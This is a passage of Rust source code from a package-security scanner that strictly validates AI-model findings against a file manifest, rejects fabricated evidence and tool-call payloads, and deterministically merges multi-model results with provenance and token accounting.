//! Strict validation, deterministic merging, and provenance for Pi scanner model output.
//!
//! Model output is hostile until proven otherwise. Validation rejects the whole attempt
//! when any of the following holds:
//!
//! - the response is not exactly one JSON object (trailing objects, prose, or fences);
//! - the object repeats a key, nests too deeply, or exceeds the compiled byte bound;
//! - identity fields do not match the frozen scan identity exactly;
//! - an enum value is unknown, a required key is missing, or an unknown key is present;
//! - a finding cites a path that is absolute, traversing, or absent from the manifest;
//! - a finding's evidence does not appear verbatim in the cited manifest entry;
//! - any text field carries terminal controls or exceeds its field bound;
//! - the payload carries tool-call structures or more findings than the bound allows.
//!
//! Nothing here can downgrade or suppress a deterministic finding, and no wording produced
//! here ever calls a package safe, clean, trusted, or passed.

use std::collections::{BTreeMap, BTreeSet};
use std::fmt;

use serde_json::Value;

use crate::pi_agent::protocol::{ProtocolError, parse_strict_json};
use crate::pi_agent::{has_forbidden_control, limits, sha256, to_hex};

use super::prompt::SCHEMA_VERSION;

/// Maximum findings accepted from one model attempt.
pub const MAX_FINDINGS: usize = 500;

/// Maximum bytes accepted in one evidence, rationale, or recommendation field.
pub const MAX_TEXT_FIELD_BYTES: usize = 4 * 1024;

/// Maximum bytes accepted in a finding title.
const MAX_TITLE_BYTES: usize = 512;

/// Maximum limitation entries accepted from one model attempt.
const MAX_LIMITATIONS: usize = 100;

/// Exact top-level keys the response object must contain, with no extras.
const REQUIRED_KEYS: [&str; 7] = [
    "commit_oid",
    "coverage",
    "findings",
    "limitations",
    "package_base",
    "scan_id",
    "schema_version",
];

/// Exact keys each finding object must contain, with no extras.
const FINDING_KEYS: [&str; 7] = [
    "evidence",
    "path",
    "rationale",
    "recommendation",
    "severity",
    "snapshot",
    "title",
];

/// Key fragments that indicate the model tried to emit a tool call instead of an answer.
const TOOL_CALL_KEYS: [&str; 6] = [
    "tool_call",
    "tool_calls",
    "function_call",
    "tool_use",
    "toolCalls",
    "toolUse",
];

/// What: Advisory severity reported by a model or a deterministic detector.
///
/// Inputs: Parsed from the exact lowercase enum names.
///
/// Output: Comparable severity where `Critical` is greatest.
///
/// Details:
/// - Ordering drives the merge rule that the highest severity controls acknowledgement.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    /// Informational observation.
    Info,
    /// Low advisory risk.
    Low,
    /// Medium advisory risk.
    Medium,
    /// High advisory risk requiring acknowledgement.
    High,
    /// Critical advisory risk requiring acknowledgement.
    Critical,
}

impl Severity {
    /// What: Parse a severity from its exact lowercase name.
    ///
    /// Inputs:
    /// - `raw`: Candidate enum text.
    ///
    /// Output:
    /// - The severity, or `None` for anything unknown.
    ///
    /// Details:
    /// - Matching is exact and case-sensitive so `CRITICAL` or `criticalish` fail closed
    ///   instead of being coerced.
    #[must_use]
    pub fn parse(raw: &str) -> Option<Self> {
        match raw {
            "info" => Some(Self::Info),
            "low" => Some(Self::Low),
            "medium" => Some(Self::Medium),
            "high" => Some(Self::High),
            "critical" => Some(Self::Critical),
            _ => None,
        }
    }

    /// What: Render the severity as its canonical lowercase name.
    ///
    /// Inputs: None.
    ///
    /// Output:
    /// - Canonical enum text.
    ///
    /// Details:
    /// - Used for canonical serialization of validated data in the raw view.
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Info => "info",
            Self::Low => "low",
            Self::Medium => "medium",
            Self::High => "high",
            Self::Critical => "critical",
        }
    }

    /// What: Report whether this severity requires deliberate acknowledgement.
    ///
    /// Inputs: None.
    ///
    /// Output:
    /// - `true` for high and critical.
    ///
    /// Details:
    /// - Acknowledgement is enforced by later workstreams; this is the shared predicate.
    #[must_use]
    pub const fn requires_acknowledgement(self) -> bool {
        matches!(self, Self::High | Self::Critical)
    }
}

/// What: Whether the model claims it analyzed the whole eligible scope.
///
/// Inputs: Parsed from the exact lowercase enum names.
///
/// Output: Coverage claim, always cross-checked against the deterministic layer.
///
/// Details:
/// - A model claim of `Complete` never overrides a deterministic `Incomplete`; the caller
///   downgrades. This type only records what the model said.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Coverage {
    /// The model claims full coverage of the analyzed scope.
    Complete,
    /// The model reports it could not analyze part of the scope.
    Incomplete,
}

impl Coverage {
    /// What: Parse coverage from its exact lowercase name.
    ///
    /// Inputs:
    /// - `raw`: Candidate enum text.
    ///
    /// Output:
    /// - The coverage, or `None` for anything unknown.
    ///
    /// Details:
    /// - Unknown values fail the whole attempt rather than defaulting to `Incomplete`.
    #[must_use]
    pub fn parse(raw: &str) -> Option<Self> {
        match raw {
            "complete" => Some(Self::Complete),
            "incomplete" => Some(Self::Incomplete),
            _ => None,
        }
    }

    /// What: Render coverage as its canonical lowercase name.
    ///
    /// Inputs: None.
    ///
    /// Output:
    /// - Canonical enum text.
    ///
    /// Details:
    /// - Used for canonical serialization of validated data.
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Complete => "complete",
            Self::Incomplete => "incomplete",
        }
    }
}

/// What: Failure modes of model-response validation.
///
/// Inputs: Produced by [`validate_response`].
///
/// Output: Implements `Display`/`Error`; the text feeds the single correction prompt.
///
/// Details:
/// - Messages are Pacsea-generated and never echo model text, so a correction prompt
///   cannot become an injection channel.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ResultError {
    /// The response exceeded the compiled byte bound.
    TooLarge {
        /// Observed byte length.
        observed: usize,
        /// Compiled bound.
        limit: usize,
    },
    /// The response was not exactly one strict JSON object.
    Framing(ProtocolError),
    /// A required key was missing.
    MissingKey {
        /// Key name.
        key: String,
    },
    /// An unexpected key was present.
    UnexpectedKey {
        /// Key name.
        key: String,
    },
    /// A value had the wrong JSON type.
    WrongType {
        /// Key name.
        key: String,
        /// Expected JSON type name.
        expected: &'static str,
    },
    /// An enum value was not one of the documented names.
    UnknownEnum {
        /// Key name.
        key: String,
    },
    /// An identity field did not match the frozen scan identity.
    IdentityMismatch {
        /// Key name.
        key: String,
    },
    /// A text field carried control characters.
    ControlCharacter {
        /// Key name.
        key: String,
    },
    /// A text field exceeded its byte bound.
    FieldTooLong {
        /// Key name.
        key: String,
        /// Observed byte length.
        observed: usize,
        /// Compiled bound.
        limit: usize,
    },
    /// A collection exceeded its item bound.
    TooManyItems {
        /// Key name.
        key: String,
        /// Observed item count.
        observed: usize,
        /// Compiled bound.
        limit: usize,
    },
    /// The payload carried a tool-call structure instead of a final answer.
    ToolCallPayload {
        /// Offending key name.
        key: String,
    },
    /// A finding cited a path that is not a manifest entry of the cited snapshot.
    UnknownEvidencePath {
        /// Cited snapshot id.
        snapshot: String,
        /// Cited path.
        path: String,
    },
    /// A finding cited evidence text that does not occur in the cited manifest entry.
    FabricatedEvidence {
        /// Cited snapshot id.
        snapshot: String,
        /// Cited path.
        path: String,
    },
}

impl fmt::Display for ResultError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::TooLarge { observed, limit } => write!(
                f,
                "the response is {observed} bytes, above the {limit}-byte limit"
            ),
            Self::Framing(inner) => {
                write!(f, "the response is not one strict JSON object: {inner}")
            }
            Self::MissingKey { key } => write!(f, "the response is missing the key {key:?}"),
            Self::UnexpectedKey { key } => {
                write!(f, "the response contains the unexpected key {key:?}")
            }
            Self::WrongType { key, expected } => {
                write!(f, "the key {key:?} must be {expected}")
            }
            Self::UnknownEnum { key } => {
                write!(f, "the key {key:?} has an undocumented enum value")
            }
            Self::IdentityMismatch { key } => write!(
                f,
                "the key {key:?} does not match the frozen scan identity; the response was discarded"
            ),
            Self::ControlCharacter { key } => {
                write!(f, "the key {key:?} contains control characters")
            }
            Self::FieldTooLong {
                key,
                observed,
                limit,
            } => write!(
                f,
                "the key {key:?} is {observed} bytes, above the {limit}-byte limit"
            ),
            Self::TooManyItems {
                key,
                observed,
                limit,
            } => write!(
                f,
                "the key {key:?} has {observed} items, above the {limit} limit"
            ),
            Self::ToolCallPayload { key } => write!(
                f,
                "the response carries the tool-call key {key:?} instead of a final answer"
            ),
            Self::UnknownEvidencePath { snapshot, path } => write!(
                f,
                "a finding cites {path:?} in snapshot {snapshot:?}, which is not a manifest entry"
            ),
            Self::FabricatedEvidence { snapshot, path } => write!(
                f,
                "a finding cites evidence that does not occur in {path:?} of snapshot {snapshot:?}"
            ),
        }
    }
}

impl std::error::Error for ResultError {}

impl From<ProtocolError> for ResultError {
    fn from(value: ProtocolError) -> Self {
        Self::Framing(value)
    }
}

/// What: Frozen identity a valid response must reproduce exactly.
///
/// Inputs: Supplied by the scan driver from the frozen scan identity.
///
/// Output: Compared field by field during validation.
///
/// Details:
/// - Identity binding is what stops a late or replayed response from validating against
///   the wrong package, commit, or scan.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExpectedIdentity {
    /// Scan identity.
    pub scan_id: String,
    /// Canonical package base.
    pub package_base: String,
    /// Full immutable recipe commit OID.
    pub commit_oid: String,
}

/// What: Manifest-backed index used to verify that cited evidence really exists.
///
/// Inputs: Built by the deterministic layer from canonical manifests.
///
/// Output: Exact-evidence lookups during validation.
///
/// Details:
/// - Only analyzed text entries carry content. A manifest-only binary entry can be cited
///   as a path but cannot support quoted evidence, which is exactly the desired behavior.
#[derive(Debug, Clone, Default)]
pub struct EvidenceIndex {
    /// Snapshot id to relative path to analyzed text content.
    entries: BTreeMap<String, BTreeMap<String, String>>,
}

impl EvidenceIndex {
    /// What: Create an empty index.
    ///
    /// Inputs: None.
    ///
    /// Output:
    /// - An index with no entries; every citation will fail.
    ///
    /// Details:
    /// - Failing closed on an empty index is intentional.
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    /// What: Insert one analyzed manifest entry.
    ///
    /// Inputs:
    /// - `snapshot`: Snapshot id.
    /// - `path`: Snapshot-relative path.
    /// - `content`: Analyzed UTF-8 content of that entry.
    ///
    /// Output:
    /// - No return value.
    ///
    /// Details:
    /// - Content is retained only for the lifetime of validation; nothing here is persisted.
    pub fn insert(&mut self, snapshot: &str, path: &str, content: &str) {
        self.entries
            .entry(snapshot.to_string())
            .or_default()
            .insert(path.to_string(), content.to_string());
    }

    /// What: Look up the analyzed content of a cited manifest entry.
    ///
    /// Inputs:
    /// - `snapshot`: Cited snapshot id.
    /// - `path`: Cited relative path.
    ///
    /// Output:
    /// - The content, or `None` when the entry is not an analyzed manifest entry.
    ///
    /// Details:
    /// - A `None` result makes the whole attempt fail with [`ResultError::UnknownEvidencePath`].
    #[must_use]
    pub fn content(&self, snapshot: &str, path: &str) -> Option<&str> {
        self.entries
            .get(snapshot)
            .and_then(|paths| paths.get(path))
            .map(String::as_str)
    }
}

/// What: One validated model finding bound to real manifest evidence.
///
/// Inputs: Produced by [`validate_response`].
///
/// Output: Merge input and UI display data.
///
/// Details:
/// - `fingerprint` is the exact-evidence identity used for deterministic union and
///   duplicate collapse across models.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ValidatedFinding {
    /// Advisory severity.
    pub severity: Severity,
    /// Short finding title.
    pub title: String,
    /// Cited snapshot id.
    pub snapshot: String,
    /// Cited snapshot-relative path.
    pub path: String,
    /// Verbatim evidence text proven to occur in the cited entry.
    pub evidence: String,
    /// Model rationale.
    pub rationale: String,
    /// Model recommendation.
    pub recommendation: String,
    /// Exact-evidence fingerprint.
    pub fingerprint: String,
}

/// What: A fully validated model attempt result.
///
/// Inputs: Produced by [`validate_response`].
///
/// Output: Merge input plus per-attempt provenance.
///
/// Details:
/// - Findings are sorted by fingerprint so a single attempt's output is canonical.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ValidatedScanResult {
    /// Echoed frozen identity, already verified to match.
    pub identity: ExpectedIdentity,
    /// Coverage claim reported by the model.
    pub coverage: Coverage,
    /// Bounded limitation notes reported by the model.
    pub limitations: Vec<String>,
    /// Validated findings sorted by fingerprint.
    pub findings: Vec<ValidatedFinding>,
}

/// What: Validate one raw model response against the whole strict contract.
///
/// Inputs:
/// - `raw`: Final assistant text for this attempt.
/// - `expected`: Frozen scan identity.
/// - `evidence`: Manifest-backed evidence index.
///
/// Output:
/// - The validated result, or the first contract violation found.
///
/// Details:
/// - Size, framing, key set, identity, enums, bounds, control characters, tool-call
///   payloads, and exact evidence are all checked before any value is accepted.
/// - Nothing is persisted or displayed unless this function returns `Ok`.
///
/// # Errors
/// - Returns `Err` for every condition documented on [`ResultError`].
pub fn validate_response(
    raw: &str,
    expected: &ExpectedIdentity,
    evidence: &EvidenceIndex,
) -> Result<ValidatedScanResult, ResultError> {
    if raw.len() > limits::MAX_FINAL_JSON_BYTES {
        return Err(ResultError::TooLarge {
            observed: raw.len(),
            limit: limits::MAX_FINAL_JSON_BYTES,
        });
    }
    let value = parse_strict_json(raw.trim(), limits::MAX_JSON_DEPTH)?;
    let Value::Object(object) = value else {
        return Err(ResultError::Framing(ProtocolError::NotAnObject));
    };
    check_key_set(&object, &REQUIRED_KEYS, "response")?;

    let schema = require_str(&object, "schema_version")?;
    if schema != SCHEMA_VERSION {
        return Err(ResultError::IdentityMismatch {
            key: "schema_version".to_string(),
        });
    }
    check_identity(&object, "scan_id", &expected.scan_id)?;
    check_identity(&object, "package_base", &expected.package_base)?;
    check_identity(&object, "commit_oid", &expected.commit_oid)?;

    let coverage = Coverage::parse(require_str(&object, "coverage")?).ok_or_else(|| {
        ResultError::UnknownEnum {
            key: "coverage".to_string(),
        }
    })?;
    let limitations = parse_limitations(&object)?;
    let findings = parse_findings(&object, evidence)?;

    Ok(ValidatedScanResult {
        identity: expected.clone(),
        coverage,
        limitations,
        findings,
    })
}

/// What: Parse and bound the `limitations` array.
///
/// Inputs:
/// - `object`: Validated response object.
///
/// Output:
/// - Sorted deduplicated limitation notes.
///
/// Details:
/// - Sorting keeps merged output canonical across models.
///
/// # Errors
/// - Returns `Err` for wrong types, control characters, oversized text, or too many items.
fn parse_limitations(object: &serde_json::Map<String, Value>) -> Result<Vec<String>, ResultError> {
    let array = object
        .get("limitations")
        .and_then(Value::as_array)
        .ok_or_else(|| ResultError::WrongType {
            key: "limitations".to_string(),
            expected: "an array of strings",
        })?;
    if array.len() > MAX_LIMITATIONS {
        return Err(ResultError::TooManyItems {
            key: "limitations".to_string(),
            observed: array.len(),
            limit: MAX_LIMITATIONS,
        });
    }
    let mut notes = Vec::with_capacity(array.len());
    for item in array {
        let text = item.as_str().ok_or_else(|| ResultError::WrongType {
            key: "limitations".to_string(),
            expected: "an array of strings",
        })?;
        check_text("limitations", text, MAX_TEXT_FIELD_BYTES)?;
        notes.push(text.to_string());
    }
    notes.sort();
    notes.dedup();
    Ok(notes)
}

/// What: Parse, bound, and evidence-check the `findings` array.
///
/// Inputs:
/// - `object`: Validated response object.
/// - `evidence`: Manifest-backed evidence index.
///
/// Output:
/// - Validated findings sorted by fingerprint.
///
/// Details:
/// - Every finding must cite a real manifest entry and quote text that occurs verbatim
///   in that entry, which is what makes fabricated evidence fail the whole attempt.
///
/// # Errors
/// - Returns `Err` for wrong types, bounds, unknown enums, or evidence failures.
fn parse_findings(
    object: &serde_json::Map<String, Value>,
    evidence: &EvidenceIndex,
) -> Result<Vec<ValidatedFinding>, ResultError> {
    let array = object
        .get("findings")
        .and_then(Value::as_array)
        .ok_or_else(|| ResultError::WrongType {
            key: "findings".to_string(),
            expected: "an array of objects",
        })?;
    if array.len() > MAX_FINDINGS {
        return Err(ResultError::TooManyItems {
            key: "findings".to_string(),
            observed: array.len(),
            limit: MAX_FINDINGS,
        });
    }
    let mut findings = Vec::with_capacity(array.len());
    for item in array {
        let entry = item.as_object().ok_or_else(|| ResultError::WrongType {
            key: "findings".to_string(),
            expected: "an array of objects",
        })?;
        findings.push(parse_finding(entry, evidence)?);
    }
    findings.sort_by(|left, right| left.fingerprint.cmp(&right.fingerprint));
    Ok(findings)
}

/// What: Validate one finding object.
///
/// Inputs:
/// - `entry`: Candidate finding object.
/// - `evidence`: Manifest-backed evidence index.
///
/// Output:
/// - The validated finding with its exact-evidence fingerprint.
///
/// Details:
/// - The cited path is validated with the same restricted-tool rules, so an absolute or
///   traversing path is rejected even though no filesystem access happens here.
///
/// # Errors
/// - Returns `Err` for missing or extra keys, bad enums, bad text, or evidence failures.
fn parse_finding(
    entry: &serde_json::Map<String, Value>,
    evidence: &EvidenceIndex,
) -> Result<ValidatedFinding, ResultError> {
    check_key_set(entry, &FINDING_KEYS, "finding")?;
    let severity = Severity::parse(require_str(entry, "severity")?).ok_or_else(|| {
        ResultError::UnknownEnum {
            key: "severity".to_string(),
        }
    })?;
    let title = require_str(entry, "title")?;
    check_text("title", title, MAX_TITLE_BYTES)?;
    let snapshot = require_str(entry, "snapshot")?;
    check_text("snapshot", snapshot, MAX_TITLE_BYTES)?;
    let path = require_str(entry, "path")?;
    check_text("path", path, MAX_TITLE_BYTES)?;
    if crate::pi_agent::restricted_tools::validate_relative_path(path).is_err() {
        return Err(ResultError::UnknownEvidencePath {
            snapshot: snapshot.to_string(),
            path: path.to_string(),
        });
    }
    let quoted = require_str(entry, "evidence")?;
    check_text("evidence", quoted, MAX_TEXT_FIELD_BYTES)?;
    let rationale = require_str(entry, "rationale")?;
    check_text("rationale", rationale, MAX_TEXT_FIELD_BYTES)?;
    let recommendation = require_str(entry, "recommendation")?;
    check_text("recommendation", recommendation, MAX_TEXT_FIELD_BYTES)?;

    let content =
        evidence
            .content(snapshot, path)
            .ok_or_else(|| ResultError::UnknownEvidencePath {
                snapshot: snapshot.to_string(),
                path: path.to_string(),
            })?;
    if quoted.is_empty() || !content.contains(quoted) {
        return Err(ResultError::FabricatedEvidence {
            snapshot: snapshot.to_string(),
            path: path.to_string(),
        });
    }

    Ok(ValidatedFinding {
        severity,
        title: title.to_string(),
        snapshot: snapshot.to_string(),
        path: path.to_string(),
        evidence: quoted.to_string(),
        rationale: rationale.to_string(),
        recommendation: recommendation.to_string(),
        fingerprint: evidence_fingerprint(snapshot, path, quoted),
    })
}

/// What: Compute the exact-evidence fingerprint used for deterministic merging.
///
/// Inputs:
/// - `snapshot`: Cited snapshot id.
/// - `path`: Cited relative path.
/// - `evidence`: Verbatim evidence text.
///
/// Output:
/// - Lowercase hex SHA-256 over the length-prefixed triple.
///
/// Details:
/// - Length prefixes prevent a crafted path/evidence split from colliding with a different
///   finding, which would otherwise let one model's finding masquerade as another's.
#[must_use]
pub fn evidence_fingerprint(snapshot: &str, path: &str, evidence: &str) -> String {
    let mut buffer = Vec::new();
    for part in [snapshot, path, evidence] {
        buffer.extend_from_slice(&(part.len() as u64).to_be_bytes());
        buffer.extend_from_slice(part.as_bytes());
    }
    to_hex(&sha256(&buffer))
}

/// What: Require an exact key set on an object.
///
/// Inputs:
/// - `object`: Candidate object.
/// - `expected`: Sorted expected key names.
/// - `label`: Object label used in errors.
///
/// Output:
/// - `Ok(())` when the key set matches exactly.
///
/// Details:
/// - Rejecting unknown keys is what blocks smuggled tool-call payloads and out-of-schema
///   side channels; tool-call shaped keys get a dedicated error for clarity.
///
/// # Errors
/// - Returns `Err` on any missing or unexpected key.
fn check_key_set(
    object: &serde_json::Map<String, Value>,
    expected: &[&str],
    label: &str,
) -> Result<(), ResultError> {
    let _ = label;
    for key in object.keys() {
        if TOOL_CALL_KEYS.contains(&key.as_str()) {
            return Err(ResultError::ToolCallPayload { key: key.clone() });
        }
        if !expected.contains(&key.as_str()) {
            return Err(ResultError::UnexpectedKey { key: key.clone() });
        }
    }
    for key in expected {
        if !object.contains_key(*key) {
            return Err(ResultError::MissingKey {
                key: (*key).to_string(),
            });
        }
    }
    Ok(())
}

/// What: Require a string value at a key.
///
/// Inputs:
/// - `object`: Candidate object.
/// - `key`: Key name.
///
/// Output:
/// - The string value.
///
/// Details:
/// - Numbers, booleans, and nulls are rejected rather than stringified.
///
/// # Errors
/// - Returns `Err` when the key is missing or not a string.
fn require_str<'a>(
    object: &'a serde_json::Map<String, Value>,
    key: &str,
) -> Result<&'a str, ResultError> {
    object
        .get(key)
        .and_then(Value::as_str)
        .ok_or_else(|| ResultError::WrongType {
            key: key.to_string(),
            expected: "a string",
        })
}

/// What: Require an identity field to match the frozen value exactly.
///
/// Inputs:
/// - `object`: Candidate object.
/// - `key`: Identity key name.
/// - `expected`: Frozen value.
///
/// Output:
/// - `Ok(())` on an exact match.
///
/// Details:
/// - Comparison is byte exact; no trimming or case folding is applied.
///
/// # Errors
/// - Returns `Err` when the value is missing, not a string, or different.
fn check_identity(
    object: &serde_json::Map<String, Value>,
    key: &str,
    expected: &str,
) -> Result<(), ResultError> {
    if require_str(object, key)? == expected {
        Ok(())
    } else {
        Err(ResultError::IdentityMismatch {
            key: key.to_string(),
        })
    }
}

/// What: Validate one model-supplied text field.
///
/// Inputs:
/// - `key`: Key name for the error.
/// - `value`: Candidate text.
/// - `limit`: Byte bound for this field.
///
/// Output:
/// - `Ok(())` when the text is control-free and within bounds.
///
/// Details:
/// - Evidence text may legitimately be a source line, so tabs would be plausible; they are
///   still rejected because canonical evidence quoting uses single-line fragments and any
///   control character could reach a terminal renderer.
///
/// # Errors
/// - Returns `Err` for control characters or oversized values.
fn check_text(key: &str, value: &str, limit: usize) -> Result<(), ResultError> {
    if has_forbidden_control(value) {
        return Err(ResultError::ControlCharacter {
            key: key.to_string(),
        });
    }
    if value.len() > limit {
        return Err(ResultError::FieldTooLong {
            key: key.to_string(),
            observed: value.len(),
            limit,
        });
    }
    Ok(())
}

/// What: One model's validated attempt, attributed for the merge.
///
/// Inputs: Assembled by the scan driver after a successful validation.
///
/// Output: Merge input.
///
/// Details:
/// - Attribution survives the merge so disagreement between models stays visible.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AttributedResult {
    /// Provider identifier, for example `openrouter`.
    pub provider: String,
    /// Exact model identifier.
    pub model: String,
    /// The validated result for this attempt.
    pub result: ValidatedScanResult,
}

/// What: One merged finding with every model that reported it.
///
/// Inputs: Produced by [`merge_results`].
///
/// Output: UI and acknowledgement input.
///
/// Details:
/// - `severity` is the maximum reported severity, which is what controls acknowledgement.
/// - `disagreement` is true when models reported different severities for the same evidence.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MergedFinding {
    /// Exact-evidence fingerprint shared by every attribution.
    pub fingerprint: String,
    /// Highest severity reported by any model.
    pub severity: Severity,
    /// Cited snapshot id.
    pub snapshot: String,
    /// Cited relative path.
    pub path: String,
    /// Verbatim evidence text.
    pub evidence: String,
    /// Per-model assessments in stable `provider/model` order.
    pub assessments: Vec<FindingAssessment>,
    /// Whether the models disagreed about severity.
    pub disagreement: bool,
}

/// What: One model's assessment of a merged finding.
///
/// Inputs: Produced by [`merge_results`].
///
/// Output: Attribution detail for the UI.
///
/// Details:
/// - Kept separate from the merged finding so no model's wording is silently dropped.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FindingAssessment {
    /// Provider identifier.
    pub provider: String,
    /// Exact model identifier.
    pub model: String,
    /// Severity this model reported.
    pub severity: Severity,
    /// Title this model reported.
    pub title: String,
    /// Rationale this model reported.
    pub rationale: String,
    /// Recommendation this model reported.
    pub recommendation: String,
}

/// What: Deterministic union of validated multi-model results.
///
/// Inputs: Produced by [`merge_results`].
///
/// Output: Merged findings plus merged coverage and limitations.
///
/// Details:
/// - Coverage is `Complete` only when every attempt claimed complete; any incomplete
///   attempt makes the merged coverage incomplete.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MergedScanResult {
    /// Frozen identity shared by every merged attempt.
    pub identity: ExpectedIdentity,
    /// Merged coverage claim.
    pub coverage: Coverage,
    /// Sorted union of limitation notes.
    pub limitations: Vec<String>,
    /// Merged findings sorted by fingerprint.
    pub findings: Vec<MergedFinding>,
}

impl MergedScanResult {
    /// What: Report the highest merged severity.
    ///
    /// Inputs: None.
    ///
    /// Output:
    /// - The maximum severity, or `None` when there are no findings.
    ///
    /// Details:
    /// - Drives the high/critical acknowledgement gate in later workstreams.
    #[must_use]
    pub fn highest_severity(&self) -> Option<Severity> {
        self.findings.iter().map(|finding| finding.severity).max()
    }

    /// What: Render the approved completion wording.
    ///
    /// Inputs: None.
    ///
    /// Output:
    /// - The exact approved status sentence.
    ///
    /// Details:
    /// - The wording is fixed by the plan. It never says safe, clean, trusted, or passed.
    #[must_use]
    pub fn completion_wording(&self) -> String {
        if self.findings.is_empty() && self.coverage == Coverage::Complete {
            "Complete — no findings in analyzed scope".to_string()
        } else if self.findings.is_empty() {
            "Incomplete — no findings in analyzed scope".to_string()
        } else {
            format!("{} finding(s) in analyzed scope", self.findings.len())
        }
    }
}

/// What: Merge validated multi-model results under the approved deterministic policy.
///
/// Inputs:
/// - `identity`: Frozen scan identity shared by every attempt.
/// - `attempts`: Validated attributed attempts, in attempt order.
///
/// Output:
/// - The merged result.
///
/// Details:
/// - Findings are unioned by exact evidence fingerprint. Identical fingerprints collapse
///   into one merged finding while every model assessment is retained and attributed.
/// - The highest reported severity controls acknowledgement; disagreement stays visible
///   instead of being averaged away.
/// - Attempts whose identity does not match are skipped, so a stale attempt can never
///   contribute findings to the wrong scan.
#[must_use]
pub fn merge_results(
    identity: &ExpectedIdentity,
    attempts: &[AttributedResult],
) -> MergedScanResult {
    let mut grouped: BTreeMap<String, MergedFinding> = BTreeMap::new();
    let mut limitations: BTreeSet<String> = BTreeSet::new();
    let mut coverage = Coverage::Complete;
    let mut contributed = false;

    for attempt in attempts {
        if attempt.result.identity != *identity {
            continue;
        }
        contributed = true;
        if attempt.result.coverage == Coverage::Incomplete {
            coverage = Coverage::Incomplete;
        }
        limitations.extend(attempt.result.limitations.iter().cloned());
        for finding in &attempt.result.findings {
            merge_one(&mut grouped, attempt, finding);
        }
    }
    if !contributed {
        coverage = Coverage::Incomplete;
    }

    let mut findings: Vec<MergedFinding> = grouped.into_values().collect();
    for finding in &mut findings {
        finding.assessments.sort_by(|left, right| {
            (&left.provider, &left.model).cmp(&(&right.provider, &right.model))
        });
        let first = finding.assessments.first().map(|entry| entry.severity);
        finding.disagreement = finding
            .assessments
            .iter()
            .any(|entry| Some(entry.severity) != first);
        finding.severity = finding
            .assessments
            .iter()
            .map(|entry| entry.severity)
            .max()
            .unwrap_or(Severity::Info);
    }
    findings.sort_by(|left, right| left.fingerprint.cmp(&right.fingerprint));

    MergedScanResult {
        identity: identity.clone(),
        coverage,
        limitations: limitations.into_iter().collect(),
        findings,
    }
}

/// What: Fold one validated finding into the merge accumulator.
///
/// Inputs:
/// - `grouped`: Accumulator keyed by fingerprint.
/// - `attempt`: The attributed attempt the finding came from.
/// - `finding`: The validated finding.
///
/// Output:
/// - No return value; the accumulator is updated in place.
///
/// Details:
/// - An exact duplicate from the same provider and model collapses instead of inflating
///   the assessment list.
fn merge_one(
    grouped: &mut BTreeMap<String, MergedFinding>,
    attempt: &AttributedResult,
    finding: &ValidatedFinding,
) {
    let assessment = FindingAssessment {
        provider: attempt.provider.clone(),
        model: attempt.model.clone(),
        severity: finding.severity,
        title: finding.title.clone(),
        rationale: finding.rationale.clone(),
        recommendation: finding.recommendation.clone(),
    };
    let entry = grouped
        .entry(finding.fingerprint.clone())
        .or_insert_with(|| MergedFinding {
            fingerprint: finding.fingerprint.clone(),
            severity: finding.severity,
            snapshot: finding.snapshot.clone(),
            path: finding.path.clone(),
            evidence: finding.evidence.clone(),
            assessments: Vec::new(),
            disagreement: false,
        });
    if !entry.assessments.contains(&assessment) {
        entry.assessments.push(assessment);
    }
}

/// What: Token and byte accounting for one logical scan.
///
/// Inputs: Accumulated by the scan driver from RPC traffic and session statistics.
///
/// Output: Reservation reconciliation and provenance input.
///
/// Details:
/// - Reported usage is preferred; the conservative byte formula is the fallback when Pi
///   statistics are unavailable or untrustworthy after a crash.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct UsageAccounting {
    /// Total UTF-8 bytes sent to and received from Pi for this scan.
    pub rpc_bytes: u64,
    /// Token count reported by Pi, when available.
    pub reported_tokens: Option<u64>,
}

impl UsageAccounting {
    /// What: Compute the conservative fallback token estimate.
    ///
    /// Inputs: None.
    ///
    /// Output:
    /// - `ceil(rpc_bytes / 2) + 8000`.
    ///
    /// Details:
    /// - This is the approved reservation formula from the plan's bounds table.
    #[must_use]
    pub const fn fallback_token_estimate(self) -> u64 {
        self.rpc_bytes.div_ceil(2).saturating_add(8_000)
    }

    /// What: Resolve the tokens to charge against the rolling budget.
    ///
    /// Inputs: None.
    ///
    /// Output:
    /// - Reported tokens when available, otherwise the fallback estimate.
    ///
    /// Details:
    /// - Never returns zero for a scan that produced traffic, so budget accounting cannot
    ///   be zeroed out by a missing statistics response.
    #[must_use]
    pub const fn effective_tokens(self) -> u64 {
        let byte_floor = self.rpc_bytes.div_ceil(2);
        match self.reported_tokens {
            Some(reported) if reported > 0 || self.rpc_bytes == 0 => {
                if reported > byte_floor {
                    reported
                } else {
                    byte_floor
                }
            }
            Some(_) | None => self.fallback_token_estimate(),
        }
    }
}

/// What: One model attempt's provenance record.
///
/// Inputs: Recorded by the scan driver per attempt.
///
/// Output: Persisted provenance detail.
///
/// Details:
/// - Every attempt is recorded, including failed and corrected ones, so cost and coverage
///   claims remain auditable.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ModelAttemptRecord {
    /// Provider identifier.
    pub provider: String,
    /// Exact model identifier.
    pub model: String,
    /// Whether the attempt produced a validated result.
    pub validated: bool,
    /// Whether the single bounded correction was used.
    pub corrected: bool,
    /// Usage accounting for this attempt.
    pub usage: UsageAccounting,
}

/// What: Full provenance bound to a scan result.
///
/// Inputs: Assembled at the end of a logical scan.
///
/// Output: Persisted alongside the merged result.
///
/// Details:
/// - Binds the result to Pi version, prompt/schema/tool contract versions, verified
///   extension hash, and every model attempt, which is what makes a stale or drifted
///   result detectable later.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScanProvenance {
    /// Verified Pi version string.
